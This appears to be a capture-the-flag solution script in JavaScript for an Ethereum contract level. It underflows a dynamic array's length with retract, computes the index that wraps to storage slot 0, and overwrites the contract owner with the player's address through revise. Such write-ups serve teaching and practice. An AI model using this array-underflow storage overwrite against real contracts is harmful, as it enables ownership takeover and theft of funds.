/*
    Well explained in README.md
*/

//  calling the makeContract function to set contract as true
await contract.makeContract()

// calling the retract contract such that codex length becomes less than 0, and we got the access to whole storage
await contract.retract()

// Getting the slot from where the codex starts, means it's data
const mapLengthAddress = "0x0000000000000000000000000000000000000000000000000000000000000001";
const mapStartSlot = BigNumber.from(ethers.utils.keccak256(mapLengthAddress));

// Getting the index of Owner in the codex
const NUMBER_OF_SLOTS = BigNumber.from("2").pow("256");
const ownerPositionInMap = NUMBER_OF_SLOTS.sub(mapStartSlot);

// Overriding the poistion of owner slot using revise function with player's address
const parsedAddress = ethers.utils.hexZeroPad(player.address, 32);
await contract.revise(ownerPositionInMap, parsedAddress);